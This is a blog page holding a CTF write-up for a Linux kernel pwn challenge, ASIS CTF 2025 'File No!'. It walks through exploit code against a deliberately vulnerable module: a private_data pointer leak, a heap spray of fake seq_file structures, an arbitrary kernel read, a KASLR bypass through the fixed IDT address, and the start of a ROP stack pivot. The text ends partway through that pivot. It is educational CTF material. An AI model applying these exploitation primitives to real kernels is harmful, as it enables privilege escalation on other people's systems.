<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> ASIS CTF 2025 File No! Writeup | Jayakrishna Menon Vadayath </title> <meta name="author" content="Jayakrishna Menon Vadayath"> <meta name="description" content="Solving the File No! challenge from ASIS CTF 2025"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://jkrshnmenon.github.io/blog/2025/asisctf25fileno/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>initTheme();</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="//"> Jayakrishna Menon Vadayath </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">ASIS CTF 2025 File No! Writeup</h1> <p class="post-meta"> Created in September 06, 2025 </p> <p class="post-tags"> <a href="//blog/2025"> <i class="fa-solid fa-calendar fa-sm"></i> 2025 </a>   ·   <a href="//blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> ctf</a>   <a href="//blog/tag/kernel"> <i class="fa-solid fa-hashtag fa-sm"></i> kernel</a>   <a href="//blog/tag/pwn"> <i class="fa-solid fa-hashtag fa-sm"></i> pwn</a>   ·   <a href="//blog/category/writeup"> <i class="fa-solid fa-tag fa-sm"></i> writeup</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <p>So, I’ve finally gotten around to trying out a kernel pwning challenge.</p> <p>I picked this one mostly because there weren’t many people working on it and I thought it would be a good learning experience. And I certainly learned a lot.</p> <p>Full disclosure, ChatGPT did help me with understanding some of the kernel stuff. But it also turns out that its pretty bad at coming up with an exploit strategy (at least for this challenge).</p> <h2 id="the-challenge">The challenge</h2> <p>We’re given all the usual stuff for a kernel challenge including the <code class="language-plaintext highlighter-rouge">bzImage</code>, <code class="language-plaintext highlighter-rouge">rootfs.ext4</code>, a <code class="language-plaintext highlighter-rouge">run</code> script and the source code for the vulnerable kernel module.</p> <p>Here’s the important bit from the module:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
<span class="p">}</span> <span class="n">req_t</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">long</span> <span class="nf">module_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">req_t</span> <span class="n">req</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="n">CMD_READ</span> <span class="o">&amp;&amp;</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="n">CMD_WRITE</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="p">(</span><span class="n">req_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">)))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">module_lock</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">fget</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">fd</span><span class="p">)))</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">S_ISREG</span><span class="p">(</span><span class="n">file_inode</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">i_mode</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
    <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="n">CMD_READ</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">req</span><span class="p">.</span><span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">target</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>                         <span class="c1">// &lt;--- BUG HERE</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">copy_to_user</span><span class="p">((</span><span class="n">req_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">)))</span> <span class="p">{</span>
      <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">unlock_on_fail</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">target</span><span class="o">-&gt;</span><span class="n">private_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">req</span><span class="p">.</span><span class="n">val</span><span class="p">;</span>                        <span class="c1">// &lt;--- BUG HERE</span>
  <span class="p">}</span>

 <span class="nl">unlock_on_fail:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fput</span><span class="p">(</span><span class="n">target</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">module_lock</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>What this module basically does is, it allows the user to read or write a <code class="language-plaintext highlighter-rouge">void *private_data</code> member in a <code class="language-plaintext highlighter-rouge">struct file</code> which I assumed would be something that can store any extra data.</p> <p>After consulting with ChatGPT, I learned that this <code class="language-plaintext highlighter-rouge">private_data</code> pointer is just a <code class="language-plaintext highlighter-rouge">NULL</code> pointer for regular files on disk, but for special files like the ones in <code class="language-plaintext highlighter-rouge">/proc/</code>, this pointer points to a special <code class="language-plaintext highlighter-rouge">struct seq_file</code> structure.</p> <p>This can easily be confirmed quickly by opening a file like <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> and using its fd to read the <code class="language-plaintext highlighter-rouge">private_data</code> pointer using the module’s <code class="language-plaintext highlighter-rouge">CMD_READ</code> command and comparing it with a regular file.</p> <pre>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">./exploit</span>
<span style="color:#ccc;">Opening vulnerable device</span> <span style="color:#f96;">/dev/vuln.ko</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(fd = 2)</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(fd = 3)</span>
<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(request.fd = 2)</span>
<span style="color:#9f9;">Val = ffff8ab001b67000</span>                 &lt;----- Leaked private_data pointer for /proc/self/maps
<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(request.fd = 3)</span>
<span style="color:#9f9;">Val = 0</span>                                &lt;----- NULL pointer for regular file
</pre> <p>So, this confirms that the <code class="language-plaintext highlighter-rouge">private_data</code> pointer for <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> is indeed a valid pointer to a <code class="language-plaintext highlighter-rouge">struct seq_file</code>. With this knowledge, the next step is to figure out how to fake a <code class="language-plaintext highlighter-rouge">struct seq_file</code> to get the flag.</p> <p>The flag is mounted into the VM as a drive:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-drive</span> <span class="nv">file</span><span class="o">=</span>/tmp/flag.txt,format<span class="o">=</span>raw,index<span class="o">=</span>1
</code></pre></div></div> <p>It’s available inside the VM as <code class="language-plaintext highlighter-rouge">/dev/sdb</code></p> <pre>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">whoami</span>
<span style="color:#f96;">root</span>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">cat /dev/sdb</span>
<span style="color:#f96;">FLAG{dummy}</span>
</pre> <p>So, our objective is to just run <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> as root.</p> <h2 id="the-struct-seq_file">The struct seq_file</h2> <p>The <code class="language-plaintext highlighter-rouge">struct seq_file</code> has a relatively simple layout:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">seq_file</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>                        <span class="c1">// Pointer to a buffer</span>
<span class="p">...</span>                                   <span class="c1">// A bunch of size_t integers</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">seq_operations</span> <span class="o">*</span><span class="n">op</span><span class="p">;</span>  <span class="c1">// Pointer to seq_operations</span>
<span class="p">...</span>
<span class="p">};</span>
</code></pre></div></div> <p>I’ve only included the really important members here. The <code class="language-plaintext highlighter-rouge">buf</code> member is a pointer to a buffer which is essentially used for buffering some data. The <code class="language-plaintext highlighter-rouge">op</code> member points to a <code class="language-plaintext highlighter-rouge">struct seq_operations</code> which is a struct of function pointers.</p> <p>With a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code>, we can control the <code class="language-plaintext highlighter-rouge">buf</code> pointer and the <code class="language-plaintext highlighter-rouge">op</code> pointers which would theoretically provide us with PC control and arbitrary read primitives.</p> <h2 id="strategy">Strategy</h2> <p>For some reason, I found that the flag was in the memory of my VM. I could see it when I ran <code class="language-plaintext highlighter-rouge">search-pattern FLAG</code> in GDB. So my idea was to just read the memory of the kernel to find the flag. And so I spent some time working on the arbitrary read primitive.</p> <p>At the same time, @zolutal and @dbena were not able to find the flag in memory on their machines (I have no idea why), and so they were working on a ROP chain to call <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> which would be invoked using the PC control primitive. However, since we did not have a kernel text leak, this would have to involve some brute-forcing. According to @zolutal, this would be a 1/512 chance of success.</p> <h2 id="arbitrary-read">Arbitrary read</h2> <h3 id="heap-spray">Heap spray</h3> <p>In order to craft a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> and overwrite the <code class="language-plaintext highlighter-rouge">private_data</code> pointer to this fake structure, I needed to first make sure that the fake structure would be present at some offset from the leaked <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <p>@zolutal suggested that simply creating a bunch of mmaped pages and filling them with fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> structures would be a good way to do this. And so I ended up with this code to do the heap spray:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// This is where I found the flag in memory using GDB</span>
  <span class="kt">size_t</span> <span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0xffff888002ede000</span><span class="p">;</span>

  <span class="c1">// Spray fake seq structures</span>
  <span class="c1">// Two 0xdeadbeefcafebabe values are for me to find the sprayed structures in memory</span>
  <span class="n">seq_t</span> <span class="n">fake_seq</span> <span class="o">=</span> <span class="p">{(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">};</span>

  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">seq_t</span> <span class="o">*</span><span class="n">spray</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">spray</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">"mmap"</span><span class="p">);</span>
      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">spray</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_seq</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">seq_t</span><span class="p">));</span>
  <span class="p">}</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"Finished spray"</span><span class="p">);</span>
</code></pre></div></div> <p>I found that this was enough to put a fake structure at an offset of <code class="language-plaintext highlighter-rouge">-0x42e000</code> from the leaked <code class="language-plaintext highlighter-rouge">private_data</code> pointer.</p> <h3 id="leaking-memory">Leaking memory</h3> <p>My plan for the arbitrary read was to craft a fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> with the <code class="language-plaintext highlighter-rouge">buf</code> pointing to the address where the flag was located in memory and then to use the <code class="language-plaintext highlighter-rouge">seq_read</code> function to read the flag into user space.</p> <p>In order to do that, I had to avoid any of the <code class="language-plaintext highlighter-rouge">ops</code> functions from being invoked as that would just crash. And I found this part of the <code class="language-plaintext highlighter-rouge">seq_read_iter</code> function (called by <code class="language-plaintext highlighter-rouge">seq_read</code> to actually do the reading) which avoids the <code class="language-plaintext highlighter-rouge">ops</code> functions.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/*
     * if request is to read from zero offset, reset iterator to first
     * record as it might have been already advanced by previous requests
     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_pos</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>                     <span class="c1">// &lt;------- HAVE TO AVOID THIS</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">...</span>
    <span class="c1">// something left in the buffer - copy it out first</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span>                             <span class="c1">// &lt;------- OTHERWISE THIS BRANCH WILL NOT BE TAKEN</span>
        <span class="n">n</span> <span class="o">=</span> <span class="n">copy_to_iter</span><span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">from</span><span class="p">,</span> <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">,</span> <span class="n">iter</span><span class="p">);</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">m</span><span class="o">-&gt;</span><span class="n">from</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">copied</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">m</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">)</span>	<span class="c1">// hadn't managed to copy everything</span>
            <span class="k">goto</span> <span class="n">Done</span><span class="p">;</span>
</code></pre></div></div> <p>I found that I just needed to update my fake <code class="language-plaintext highlighter-rouge">struct seq_file</code> with the following data:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">fake_seq</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_addr</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">from</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">count</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
  <span class="n">fake_seq</span><span class="p">.</span><span class="n">read_pos</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</code></pre></div></div> <p>And combined with an lseek, I could trigger the branch that executes the <code class="language-plaintext highlighter-rouge">goto Done;</code> thus avoiding any of the <code class="language-plaintext highlighter-rouge">ops</code> functions.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// leak_addr comes from the CMD_READ ioctl</span>
  <span class="kt">uint64_t</span> <span class="n">leak_page</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x42e000</span><span class="p">;</span>
  <span class="kt">uint64_t</span> <span class="n">fake_seq_addr</span> <span class="o">=</span> <span class="n">leak_page</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>

  <span class="n">request</span><span class="p">.</span><span class="n">val</span> <span class="o">=</span> <span class="n">fake_seq_addr</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Overwriting private_data with %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">request</span><span class="p">.</span><span class="n">val</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">ioctl</span><span class="p">(</span><span class="n">vuln_fd</span><span class="p">,</span> <span class="n">CMD_WRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">request</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"ioctl"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kt">char</span> <span class="n">flag_buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"FLAG %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flag_buf</span><span class="p">);</span>
</code></pre></div></div> <p>And this was working and printing the flag on my machine:</p> <pre>
<span style="color:#6c6;">#</span> <span style="color:#69f;">./exploit</span>
<span style="color:#ccc;">Opening vulnerable device...</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps...</span>
<span style="color:#ccc;">Sending ioctl to read from sys file</span>
<span style="color:#9f9;">Private data leak = 0xffff888002f67b40</span>
<span style="color:#ccc;">Finished spray</span>
<span style="color:#9f9;">Overwriting private_data with 0xffff888002b39000</span>
<span style="color:#ff5555;font-weight:bold;">FLAG FLAG{dummy}</span>
</pre> <p>But this wasn’t working on anyone else’s machine. However, I could just replace the <code class="language-plaintext highlighter-rouge">flag_addr</code> with any address that I wanted to read which was basically an arbitrary read primitive.</p> <h2 id="its-rop-time">It’s ROP time</h2> <p>By the time I had gotten to this point, @zolutal and @dbena had come up with a ROP chain to call <code class="language-plaintext highlighter-rouge">cat /dev/sdb</code> using the PC control primitive.</p> <h3 id="leaking-kernel-base">Leaking kernel base</h3> <p>After asking @zolutal and @kylebot, it turns out that there’s an area of the kernel which is not randomized. The Interrupt Descriptor Table (IDT), apparently is always at the address <code class="language-plaintext highlighter-rouge">0xfffffe0000000000</code>.</p> <p>According to @zolutal, everything in the CPU Entry Area is randomized except for this IDT. Now this IDT is a table of <code class="language-plaintext highlighter-rouge">struct idt_entry</code> elements. And each <code class="language-plaintext highlighter-rouge">struct idt_entry</code> has a layout like this:</p> <pre>
<span style="color:#69f;">offset</span>  <span style="color:#69f;">size</span>  <span style="color:#69f;">field</span>
<span style="color:#aaa;">------  ----  ----------------------------</span>
<span style="color:#6c6;">0x00</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset0</span>      <span style="color:#aaa;">(addr bits 0..15)</span>
<span style="color:#6c6;">0x02</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">selector</span>
<span style="color:#6c6;">0x04</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">ist:type:dpl:p</span>  <span style="color:#aaa;">(attributes word)</span>
<span style="color:#6c6;">0x06</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset1</span>      <span style="color:#aaa;">(addr bits 16..31)</span>
<span style="color:#6c6;">0x08</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">offset2</span>      <span style="color:#aaa;">(addr bits 32..63)</span>
<span style="color:#6c6;">0x0c</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">reserved</span>
</pre> <p>By reading the first element of the IDT, we can get a pointer to the kernel text segment which defeats KASLR. We don’t need the whole <code class="language-plaintext highlighter-rouge">struct idt_entry</code> to do this, just the bytes from 4 to 12 which contains the <code class="language-plaintext highlighter-rouge">&lt;offset2:4bytes&gt;&lt;offset1:2bytes&gt;&lt;ist:type:dpl:p:2bytes&gt;</code> which gives us all but the last 2 bytes of the address. And since the kernel text base is aligned to a 2MiB boundary, the last 2 bytes are always <code class="language-plaintext highlighter-rouge">0x0000</code>.</p> <p>So my script was now updated to do this:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// IDT (0xfffffe0000000000) + 4</span>
  <span class="kt">size_t</span> <span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0xfffffe0000000004</span><span class="p">;</span>
<span class="p">...</span>
<span class="p">...</span>
  <span class="kt">char</span> <span class="n">flag_buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
  <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

  <span class="c1">// -0x8e00 to zero-out the last 2 bytes</span>
  <span class="kt">uint64_t</span> <span class="n">kaslr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="n">flag_buf</span><span class="p">)</span><span class="o">-</span><span class="mh">0x8e00</span><span class="p">;</span>
</code></pre></div></div> <h3 id="rop-chain">ROP chain</h3> <p>Since we had already sprayed a bunch of <code class="language-plaintext highlighter-rouge">struct seq_file</code> structures, we could just update them in order to place correct <code class="language-plaintext highlighter-rouge">seq_operations</code> pointers within them.</p> <p>When any of the <code class="language-plaintext highlighter-rouge">ops</code> functions are called, the first argument is always a pointer to the <code class="language-plaintext highlighter-rouge">struct seq_file</code>. So, if we could find a gadget that can move the value of <code class="language-plaintext highlighter-rouge">rdi</code> into <code class="language-plaintext highlighter-rouge">rsp</code>, we could pivot the stack into a ROP chain.</p> <p>And surprisingly, there was this gadget in the kernel:</p> <pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">x/6i 0xffffffff814b1a35</span>
   <span style="color:yellow">0xffffffff814b1a35</span>:	<span style="color:lightblue;font-weight:bold">push</span>   <span style="color:white">rdi</span>
   <span style="color:yellow">0xffffffff814b1a36</span>:	<span style="color:lightblue;font-weight:bold">mov</span>    <span style="color:white">ebx</span>,<span style="color:orange">0x415bfffa</span>
   <span style="color:yellow">0xffffffff814b1a3b</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rsp</span>
   <span style="color:yellow">0xffffffff814b1a3c</span>:	<span style="color:lightblue;font-weight:bold">cdqe</span>
   <span style="color:yellow">0xffffffff814b1a3e</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rbp</span>
